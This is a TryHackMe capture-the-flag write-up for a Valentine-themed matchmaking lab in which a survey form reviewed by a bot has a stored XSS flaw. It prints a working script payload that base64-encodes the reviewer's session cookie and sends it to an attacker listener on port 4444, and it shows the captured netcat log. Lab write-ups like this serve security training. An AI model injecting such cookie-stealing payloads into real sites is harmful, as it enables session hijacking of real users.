# Cupid's Matchmaker – TryHackMe Write-Up

---

## 📌 Challenge Overview

**Goal:** Use your web exploitation skills against this matchmaking service.

**Challenge Description:**
> "My Dearest Hacker, Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! 💘 No algorithms. No AI. Just genuine human connection."

---

## 🌐 Accessing the Application

The web application is accessible at:
`http://<TARGET_IP>:5000`

I visited the site and submitted a survey. Upon submission, the application stated that my survey would be "reviewed by the team shortly." This manual review process suggested a potential for **Stored XSS (Cross-Site Scripting)**.

---

## 🧪 Exploitation: Stored XSS

To test this, I crafted a script designed to exfiltrate the reviewer's session cookie to my attacker machine.

### 1. The Payload
I used the following JavaScript to fetch the document cookie, encode it in Base64 (to ensure it transmits clearly via URL), and send it to my listener:

```html
<script>
  fetch('[http://192.168.129.113:4444?cookie=](http://ATTACKER_IP:4444?cookie=)' + btoa(document.cookie));
</script>
```
## Capturing the Cookie
I opened a Netcat listener on my machine at port 4444. After a few minutes, the "matchmaking team" bot reviewed my survey, triggering the script.

```html
listening on [any] 4444 ...
connect to [192.168.129.113] from (UNKNOWN) [10.49.180.100] 34300
GET /?cookie=ZmxhZz.... HTTP/1.1
Host: 192.168.129.113:4444
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/144.0.0.0 Safari/537.36
...
```
# Decoding the Flag
The captured value ZmxhZ.... was Base64 encoded.
```bash
echo "ZmxhZ...." | base64 -d
```
# Result: flag=THM{REDACTED}

# 🚨 Final Thoughts
This scenario demonstrates how "Human-in-the-loop" processes can be exploited if the input is not properly sanitized. 
By injecting a malicious script into the survey, I was able to hijack the reviewer's session information as soon as they opened my submission.
